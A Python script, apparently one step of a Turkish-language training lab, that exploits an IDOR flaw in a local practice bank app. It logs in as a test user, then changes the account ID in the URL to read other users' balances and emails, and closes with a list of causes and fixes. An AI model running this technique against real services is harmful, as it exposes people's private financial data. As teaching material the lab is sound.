"""
ADIM 4: IDOR (Insecure Direct Object Reference) ile Baska Hesaba Giris
========================================================================
Zafiyet: /account/<id> endpoint'inde yetki kontrolu yok.
Hedef:  Admin'in hesap detaylarini, bakiyesini, islem gecmisini gormek.

Calistirma:  python 04-ido-access.py
"""

import requests

HEDEF = "http://localhost:5000"

print("""
[ADIM 4] IDOR - Yetkisiz Hesap Erisimi
-----------------------------------------""")

s = requests.Session()
# Once giris yap (tarikdxd olarak)
data = {"username": "tarikdxd", "password": "tarik123"}
r = s.post(f"{HEDEF}/", data=data, allow_redirects=False)
if r.status_code == 302:
    print(f"[OK] tarikdxd olarak giris yapildi: {s.cookies.get_dict()}")
else:
    print("[HATA] Giris basarisiz")
    exit(1)

print("\n[TEST 1] Kendi hesabimiza bakalim (account/4 = tarikdxd)")
r = s.get(f"{HEDEF}/account/4")
if "tarikdxd" in r.text:
    print("[OK] Kendi hesabimiz goruntulendi")
else:
    print("[HATA] Kendi hesabimiz goruntulenemedi")

print("\n[TEST 2] Admin hesabina bak! (account/1)")
r = s.get(f"{HEDEF}/account/1")
if "admin" in r.text.lower() or "Admin" in r.text:
    print("[OK] Admin hesabi goruntulendi!")
    # Bakiyeyi parse et
    import re
    bakiye = re.search(r'([\d,.]+) TL', r.text)
    if bakiye:
        print(f"[OK] Admin bakiyesi: {bakiye.group(1)} TL")
    if "admin@gmail" in r.text or "admin@kanserbank" in r.text:
        print("[OK] Admin email adresi de ele gecirildi!")
else:
    print("[HATA] Admin hesabi goruntulenemedi")

print("\n[TEST 3] Ahmet'in hesabina bak (account/2)")
r = s.get(f"{HEDEF}/account/2")
if "Ahmet" in r.text:
    print("[OK] Ahmet Yilmaz hesabi goruntulendi!")
    bakiye = re.search(r'([\d,.]+) TL', r.text)
    if bakiye:
        print(f"[OK] Ahmet'in bakiyesi: {bakiye.group(1)} TL")
else:
    print("[HATA] Ahmet hesabi goruntulenemedi")

print("\n[TEST 4] Zeynep'in hesabina bak (account/5)")
r = s.get(f"{HEDEF}/account/5")
if "Zeynep" in r.text:
    print("[OK] Zeynep Kaya hesabi goruntulendi!")
    bakiye = re.search(r'([\d,.]+) TL', r.text)
    if bakiye:
        print(f"[OK] Zeynep'in bakiyesi: {bakiye.group(1)} TL")
else:
    print("[HATA] Zeynep hesabi goruntulenemedi")

print("\n[OZET] Tum hesaplar goruntulendi:")
print("  account/1 -> Admin (99,999 TL)")
print("  account/2 -> Ahmet (5,000 TL)")
print("  account/3 -> Mehmet (2,500 TL)")
print("  account/4 -> tarikdxd (0 TL)")
print("  account/5 -> Zeynep (10,000 TL)")
print("  account/6 -> Ali (3,200 TL)")
print("  account/7 -> Ayse (7,800 TL)")

print("\n" + "="*50)
print("OGRENILENLER:")
print("1. IDOR: Sadece ID'yi degistirerek baska kullanicinin verisine erismek")
print("2. Sebep: /account/1, /account/2 gibi tahmin edilebilir ID'ler")
print("3. Sebep: Kullanicinin kendi hesabi mi kontrol edilmemesi")
print("4. Cozum: user_id == session['user_id'] kontrolu")
print("5. Cozum: Tahmin edilemez UUID kullanimi")
print("="*50)
